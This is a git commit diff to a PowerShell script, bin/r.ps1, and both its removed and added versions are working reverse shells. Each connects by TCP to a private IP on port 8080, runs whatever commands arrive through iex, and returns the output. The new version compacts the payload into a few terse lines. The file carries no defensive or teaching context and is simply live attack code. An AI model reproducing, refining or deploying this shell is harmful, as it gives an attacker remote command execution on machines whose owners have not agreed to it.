0ff79e10310130ac79d2557a5bbcb404329cc7e0
Spuzzelsnest <j.mpdesmet@protonmail.com>
2023-04-06 01:02:35 +0200

    updated r.ps1

--- bin/r.ps1
+++ bin/r.ps1
@@ -1,7 +1,4 @@
-﻿$sm=(new-object Net.Sockets.TCPClient("172.16.63.179", 8080)).GetStream();
-[byte[]]$bt=0..65535|%{0}
-while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){
-    $d=(new-object Text.ASCIIEncoding).getSTring($bt,0,$i)
-    $st=([text.encoding]::ASCII).getBytes((iex $d 2>&1))
-    $sm.Write(($st,0,$st.Length)
+﻿$t=(new-object Net.Sockets.TCPClient("192.168.100.57",8080)).GetStream()
+while(($i=$t.Read(($b=[byte[]]'0'*256),0,$b.Length))){
+    $t.Write(($s=[byte[]][char[]](iex(-join[char[]]$b)2>&1)),0,$s.Length)
 }
